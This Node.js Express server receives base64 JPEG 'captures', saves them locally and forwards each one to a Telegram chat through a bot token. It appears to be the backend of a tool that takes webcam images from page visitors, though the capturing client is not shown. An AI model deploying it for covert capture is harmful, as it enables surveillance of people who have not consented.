const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('.'));

// ===== CONFIGURE YOUR TELEGRAM CREDENTIALS =====
const BOT_TOKEN = 'YOUR_BOT_TOKEN';   // from @BotFather
const CHAT_ID   = 'YOUR_CHAT_ID';     // from @userinfobot (numeric)
// ================================================

app.post('/upload', async (req, res) => {
  const base64 = req.body.image.replace(/^data:image\/jpeg;base64,/, '');
  const buffer = Buffer.from(base64, 'base64');
  const filename = `capture_${Date.now()}.jpg`;

  // Save to local folder (Render ephemeral – good for quick access)
  const folder = './captures';
  if (!fs.existsSync(folder)) fs.mkdirSync(folder);
  const localPath = path.join(folder, filename);
  fs.writeFileSync(localPath, buffer);
  console.log(`📁 Saved locally: ${filename}`);

  // Send to Telegram
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: filename, contentType: 'image/jpeg' });
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: { ...form.getHeaders() }
    });
    console.log(`📤 Sent to Telegram: ${filename}`);
  } catch (err) {
    console.error('Telegram error:', err.response?.data || err.message);
  }

  res.json({ ok: true, saved: filename });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
